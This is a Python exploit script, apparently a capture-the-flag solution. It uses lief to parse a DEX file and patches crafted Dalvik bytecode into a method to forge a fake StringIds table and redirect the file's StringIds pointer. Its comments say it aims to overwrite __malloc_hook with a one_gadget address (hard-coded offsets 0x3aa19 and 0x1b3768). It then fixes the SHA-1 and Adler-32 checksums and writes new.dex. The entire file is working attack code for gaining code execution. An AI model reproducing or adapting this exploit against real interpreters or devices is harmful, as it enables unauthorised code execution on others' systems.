import sys
import lief
import hashlib, zlib
import struct

OP_IGET = chr(0x52)
OP_IPUT = chr(0x59)
OP_NEW_ARRAY = chr(0x23)
OP_CONST_STRING = chr(0x1a)
OP_CONST = chr(0x14)
OP_REM_INT = chr(0x94)
OP_SUB_INT = chr(0x91)
OP_ADD_INT = chr(0x90)

def patch(rd, off, d):
    return rd[:off] + d + rd[off+len(d):]

def iget(vA, vB, vC):
    istr = OP_IGET
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def iput(vA, vB, vC):
    istr = OP_IPUT
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def newarray(vA, vB, vC):
    istr = OP_NEW_ARRAY
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def newstring(vA, vB):
    istr = OP_CONST_STRING
    istr += chr(vA)
    istr += struct.pack('<H', vB)
    return istr

def newint(vA, vB):
    istr = OP_CONST
    istr += chr(vA)
    istr += struct.pack('<I', vB)
    return istr

def rem(vA, vB, vC):
    istr = OP_REM_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def sub(vA, vB, vC):
    istr = OP_SUB_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def add(vA, vB, vC):
    istr = OP_ADD_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr


dex = lief.DEX.parse(sys.argv[1])
#help(dex.header)
#print(dex.header)
#print(dex.header.checksum)
print(dex.methods[1])
print(dex.methods[1].code_offset)

#new-array to fake stringIds
#iget v1, v0_str, strid__heap_addr_0
#...x4
#calculate_cur_string_addr
#iput v1, v0_str, strid_dexfile_stringIds_1


one_gadget = 0x3aa19
malloc_hook = 0x1b3768


# Start Patching
with open(sys.argv[1], 'rb') as fd:
    rawdata = fd.read()


pc = dex.methods[1].code_offset + 6
rawdata = patch(rawdata, pc, newarray(1, 0, 3))     # v0: len; v1: array
pc += 4
rawdata = patch(rawdata, pc, newstring(2, 0))   # v2: string
pc += 4
rawdata = patch(rawdata, pc, iget(0, 2, 0))     # v0: second byte of StringIds ptr
pc += 4
rawdata = patch(rawdata, pc, newint(17, 0x10))  # store offset to fake StringIds (Array base + 0x70)
pc += 6
rawdata = patch(rawdata, pc, add(0, 0, 17))     # v0 now stores the new offset of fake StringIds
pc += 4

# Before we patch the StringIds, we need to do a few setups to fake all the offsets/strings we need later
# We need to patch 4 bytes of __malloc_hook to one_gadget, and more for Array to index, so we can do online
# patching
for i in range(12):
    rawdata = patch(rawdata, pc, newint(3, 0x26a + i*4))
    pc += 6
    rawdata = patch(rawdata, pc, iput(3, 1, 1+i))     # string 1-12: "22" - "33" : offset to index string
    pc += 4                                           # "38" - "49" placing fake string data

for i in range(4):                      # setup the new string offset, new id 12 - 15
    rawdata = patch(rawdata, pc, newint(3, 0x1018 + (38+i)*4))
    pc += 6
    rawdata = patch(rawdata, pc, iput(3, 1, 0xd+i))
    pc += 4

rawdata = patch(rawdata, pc, iput(0, 2, 0))     # patch StringIds pointer to Array area
pc += 4



# Patch Checksum
h1 = hashlib.sha1(rawdata[0x20:]).digest()
rawdata = patch(rawdata, 0xc, h1)
h2 = struct.pack('<I', zlib.adler32(rawdata[0xc:])&0xffffffff)
rawdata = patch(rawdata, 8, h2)

with open('new.dex', 'wb') as fd:
    fd.write(rawdata)
